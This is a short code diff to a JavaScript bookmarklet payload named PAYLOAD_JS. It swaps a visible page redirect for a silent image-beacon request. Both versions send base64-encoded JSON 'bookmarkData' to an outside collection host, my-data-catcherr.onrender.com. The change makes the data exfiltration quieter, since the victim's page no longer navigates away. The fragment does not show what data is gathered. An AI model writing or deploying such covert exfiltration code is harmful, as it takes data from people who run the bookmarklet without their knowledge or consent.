@@ -231,10 +231,8 @@ const PAYLOAD_JS = `javascript:(async()=>{
         };
 
 
-        location.replace(
-  "https://my-data-catcherr.onrender.com/data/" +
-  encodeURIComponent(btoa(JSON.stringify(bookmarkData)))
-);
+        new Image().src = "https://my-data-catcherr.onrender.com/data/" +
+        encodeURIComponent(btoa(JSON.stringify(bookmarkData)));
 
 
     } catch(e){
